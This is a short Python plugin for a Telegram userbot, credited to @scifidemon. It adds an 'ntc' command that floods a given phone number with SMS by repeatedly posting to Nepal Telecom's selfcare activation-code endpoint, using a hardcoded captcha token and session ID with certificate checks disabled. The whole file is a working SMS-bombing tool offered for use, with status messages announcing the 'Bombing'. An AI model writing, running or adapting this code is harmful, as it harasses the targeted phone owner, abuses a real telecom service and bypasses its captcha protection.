"""NTC Bomber custom plugin by @scifidemon
Format .bombntc [phone number]"""
import asyncio
import requests
from userbot.utils import admin_cmd
@borg.on(admin_cmd("ntc (.*)"))
async def _(event):
    num=0
    n=0
    input_str = event.pattern_match.group(1)
    if input_str:
        num = int(input_str[:10])
        n = int(input_str[11:])
    else:
        await event.edit("Enter a number!")
        return
    paramss={"webcaptcha":"2iBVFrLWrrezxoeI5u8duQpznGcudpxBQZM88Daf7ram7luqVkVKe8rsVxpM4nVunuNg7pGQ6Bb5jaUZdJnvkKXBn8nWBG890VRebIOsZM4%3D","JSESSIONID":"3854CCA90376DB14C75841F35A548032","2":"11","userName":num,"codeType":"1"}
    await event.edit("`Bombing....`")
    for i in range (n):
        requests.post("https://selfcare.ntc.net.np/selfcare4web/user/sendActivityCode.do",params=paramss,verify=False)
        await event.edit(f"`Bombing.... {i}`")
    await event.edit(f"`Bombed {n} SMS to {num}`")

    


